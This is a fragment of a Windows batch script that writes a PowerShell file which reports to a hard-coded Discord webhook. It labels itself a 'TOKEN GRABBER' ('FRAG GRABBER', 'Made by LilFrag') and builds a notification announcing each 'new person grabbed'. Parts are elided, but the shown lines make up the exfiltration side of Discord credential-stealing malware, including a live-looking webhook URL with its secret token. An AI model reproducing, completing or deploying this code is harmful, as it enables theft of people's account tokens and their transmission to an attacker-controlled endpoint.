...
echo     $webhook = "https://discord.com/api/webhooks/1081926717695868938/SIYexQb665vMA7NmqfQn0AhR5tqRRw5fnG1HJjRcoWq8eZzhGIBU_YrtSXkifFPC3CWQ" >> powershell.ps1
...
echo             @{ >> powershell.ps1
echo                 "title" = "FRAG GRABBER" >> powershell.ps1
echo                 "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
echo                 "description" = "New person grabbed using frag's TOKEN GRABBER" >> powershell.ps1
echo                 "color" = "16711680" >> powershell.ps1
echo                 "footer" = @{ >> powershell.ps1
echo                     "text" = "Made by LilFrag" >> powershell.ps1
echo                 } >> powershell.ps1
